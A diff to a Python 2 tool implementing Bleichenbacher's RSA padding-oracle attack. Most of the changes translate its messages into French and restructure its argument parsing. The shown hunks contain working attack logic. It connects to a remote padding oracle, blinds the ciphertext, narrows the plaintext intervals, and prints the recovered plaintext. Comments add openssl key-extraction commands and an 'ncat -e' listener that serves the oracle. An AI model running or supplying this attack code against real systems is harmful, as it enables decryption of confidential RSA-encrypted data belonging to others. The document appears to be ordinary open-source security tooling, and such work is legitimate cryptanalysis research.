@@ -17,11 +17,29 @@ import argparse
 
 print "\n"
 print "\t~~~~~~~~~~~~~~~~~~~~~~~~~"
-print "\t  Bleichenbacher Attack  "
+print "\tAttaque de Bleichenbacher"
 print "\t       Zweisamkeit       "
-print "\t    GNU GPL v3 License   "
+print "\t    Licence GNU GPL v3   "
 print "\t~~~~~~~~~~~~~~~~~~~~~~~~~"
 print "\n"
+
+# Vérification arguments
+
+"""if len(sys.argv) != 7:
+  print "Erreur d'arguments : ./bleichenbacher.py module exposant cryptogramme host port padding_error_message"
+  exit()"""
+
+parser = argparse.ArgumentParser(description='This program allows to carry out a Bleichenbacher Attack')
+parser.add_argument('-n', dest='n',type=int,help='RSA public key modulus (int)',required=True)
+parser.add_argument('-e', dest='e',type=int,help='RSA public key exponent (int)',required=True)
+parser.add_argument('-c', dest='c',type=int,help='ciphertext (int)',required=True)
+parser.add_argument('--host', dest='host',type=str,help='hostname',required=True)
+parser.add_argument('-p', dest='port',type=int,help='port',required=True)
+parser.add_argument('--error', dest='error',type=str,help='Oracle Padding Error',required=True)
+
+args = parser.parse_args()
+
+n, e, c, host, port, error = args.n, args.e, args.c, args.host, args.port, args.error
 
 # Augmente nombre appels recursifs
 
@@ -50,30 +68,19 @@ def Exces(x,y):
 
 # Module : openssl rsa -pubin -in public.key -modulus 2>/dev/null | grep Modulus | cut -d '=' -f 2
 
+#n = int(sys.argv[1],16)
+
 # Exposant publique openssl rsa -in public.key -pubin -text -noout | grep Exponent | cut -d ' ' -f 2
+
+#e = int(sys.argv[2])
 
 # Message chiffré cryptogramme.txt
 
+#c = int(sys.argv[3],16)
+
 # Oracle ncat -lvp 4444 -e ./oracle --keep-open
 
-parser = argparse.ArgumentParser(description='This program allows to carry out a Bleichenbacher Attack')
-parser.add_argument('-n', dest='n',type=int,help='RSA public key modulus',required=True)
-parser.add_argument('-e', dest='e',type=int,help='RSA public key exponent',required=True)
-parser.add_argument('-c', dest='c',type=int,help='cipher text',required=True)
-parser.add_argument('--host', dest='host',type=str,help='hostname',required=True)
-parser.add_argument('-p', dest='port',type=int,help='port',required=True)
-parser.add_argument('--error', dest='error',type=str,help='error padding message',required=True)
-
-args=parser.parse_args()
-
-n=args.n
-e=args.e
-c=args.c
-host=args.host
-port=args.port
-error=args.error
-
-print "\t[+] Connection to Oracle..."
+print "\tÉtablissement de la connexion à l'Oracle..."
 
 server=(host,port)
 
@@ -81,7 +88,7 @@ sock=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
 sock.connect(server)
 
-print "\t[+] Connection established\n"
+print "\tConnexion à l'Oracle établie.\n"
 
 # Appel à Oracle qui va déchiffrer le cryptogramme et indiquer si le padding est valide ou non
 
@@ -150,9 +157,9 @@ def Inv_mod(x, m):
 
 # Blinding - Étape 1
 
-print "\t[+] Attack launch...\n"
+print "\tLancement de l'attaque...\n"
 
-print "\t[+] Binding launch..."
+print "\tBrouillage en cours..."
 
 maximum=10**10 # Valeur arbitraire
 s0 = random.randint(1,maximum)
@@ -162,7 +169,7 @@ while not Oracle(c0):
   s0 = random.randint(1,maximum) # Cherche un s0 random tel que c0 soit conforme
   c0 = (c * (pow(s0,e,n))) % n
 
-print "\t[+] Binding done.\n"
+print "\tBrouillage terminé.\n"
 #print "s0 random utilisé : ", s0
 
 k = 256 # Taille du module en bytes
@@ -175,7 +182,7 @@ M |= set([B2, B3-1])
 
 # Initialisation - Étape 2.a
 
-print "\t[+] Construction and narrowing the sets..."
+print "\tConstruction et affinage des encadrements en cours..."
 
 si = Exces(n,3*B) # On initialise si
 si = Recherche(si) # On cherche le premier si valable
@@ -198,21 +205,12 @@ def Iteration(si,M):
   elif (len(M) == 1) : # S'il n'y a qu'un seul intervalle encadrant le plaintext # Étape 4
     (a,b)=(list(M)[0][0],list(M)[0][1])
     if (a==b): # Si l'amplitude de l'unique intervalle est nulle, on a le plaintext
-      print "\t[+] Construction and narrowing the sets done.\n"
+      print "\tConstruction et affinage des encadrements terminés.\n"
       plaintext = (a * Inv_mod(s0,n)) % n
-      print "\tTha plaintext is: {}\n".format(plaintext)
-
-      try:
-
-        print "\t[+] The interpreted plaintext is: {}\n\n".format(hex(plaintext)[3:].replace('L','').decode('hex')) # Renvoie le plaintext
-
-      except:
-
-        print "\t[-] This plaintext is uninterpretable\n"
-
-      print "\n\t[+] Attack done.\n"
+      print "\tLe message en clair est : \n\n", hex(plaintext)[3:].replace('L','').decode('hex') # Renvoie le plaintext
+      print "\n\tFin de l'attaque.\n"
       sock.close()
-      print "\t[+] Connection closed.\n"
+      print "\tConnexion cloturée.\n"
       exit()
     else : # Si l'on n'a qu'un intervalle d'amplitude non nulle, on utilise l'optimisation binaire pour trouver si plus rapidement # Étape 2.c
       si = Recherche_Binaire(si,a,b) # On recherche le prochain si de manière optimisée
@@ -238,3 +236,5 @@ Iteration(si,M)
 # Si, au contraire, len(M) = 1, je distingue deux cas :
   # Soit les bornes de l'intervalle sont distinctes, et alors on utilise la recherche binaire optimisée pour trouver le prochain si et affiner cet unique intervalle.
   # Soit les bornes de l'intervalle sont égales, et alors on renvoie le plaintext a * Inv_mod(s0,n) % n, a étant l'une de ces bornes.
+
+
